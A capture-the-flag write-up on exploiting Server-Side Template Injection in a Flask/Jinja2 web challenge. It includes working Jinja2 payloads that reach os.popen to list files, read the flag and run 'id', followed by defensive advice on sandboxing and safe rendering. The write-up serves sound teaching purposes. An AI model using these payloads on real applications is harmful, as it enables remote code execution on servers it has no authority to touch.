## Introduction

**Server-Side Template Injection (SSTI)** is a critical web vulnerability that occurs when user-supplied input is embedded directly into a server-side template without sanitization. In Flask/Jinja2 applications, this allows attackers to inject template expressions that are evaluated on the server, ultimately enabling Remote Code Execution (RCE).

> **Challenge Description:** "I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!"

## Solution Walkthrough

### Step 1: Open the Website

Navigate to the challenge URL. The page has an input field where you can type announcements, and it echoes back your input.

### Step 2: Identify the Backend Technology

Run a `curl` HEAD request to inspect server headers:

```bash
curl -i http://rescued-float.picoctf.net:53913/
```

**Sample Response:**
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.8.10
Content-Type: text/html; charset=utf-8
```

The `Server: Werkzeug` header confirms this is a **Flask** application using **Jinja2** templates.

### Step 3: Confirm SSTI with a Basic Probe

Inject a Jinja2 arithmetic expression into the input field:

```jinja2
{% raw %}{{7*7}}{% endraw %}
```

If the page displays `49` instead of the literal string `{{7*7}}`, the server is **evaluating template expressions** from user input — SSTI is confirmed.

### Step 4: Enumerate Files via SSTI RCE

Use the Jinja2 `config` object to traverse to the `os` module and run shell commands:

```jinja2
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}{% endraw %}
```

This lists the files in the current directory on the server. Look for a file named `flag`.

### Step 5: Read the Flag

```jinja2
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}{% endraw %}
```

The flag contents are printed directly in the server's response.

## Key Concepts

**SSTI Payload Anatomy:**

```jinja2
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}{% endraw %}
```

| Component | Purpose |
|---|---|
| `config` | Flask's Config object — always available in template context |
| `.__class__` | Get the class of the config object |
| `.__init__` | Access the `__init__` method of that class |
| `.__globals__` | Access all global variables in scope at `__init__` definition |
| `['os']` | Get the `os` module from globals |
| `.popen('cat flag').read()` | Execute OS command and capture output |

**What Happens Without SSTI Protection:**

```
User Input:  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Server sees: uid=1000(app) gid=1000(app) groups=1000(app)
```

The template engine executes the expression before rendering the response.

## Security Insights

- **Never pass user input directly to a template renderer:** Always treat user input as data, not code. Templates must only receive pre-validated, sanitized data.
- **Use `render_template()` with context variables:** In Flask, never use `render_template_string(user_input)` — use `render_template('file.html', data=user_input)` instead.
- **Enable Jinja2 sandboxing:** Jinja2's `SandboxedEnvironment` restricts access to Python internals, preventing traversal to `__globals__`.
- **Principle of Least Privilege:** Run web applications with minimal OS permissions to limit the damage if RCE is achieved.

---

## Conclusion

SSTI vulnerabilities are among the most severe web application vulnerabilities because they grant full server code execution. The attack path from user input to `os.popen()` execution demonstrates how a seemingly harmless "echo whatever you type" feature can become a complete server compromise.
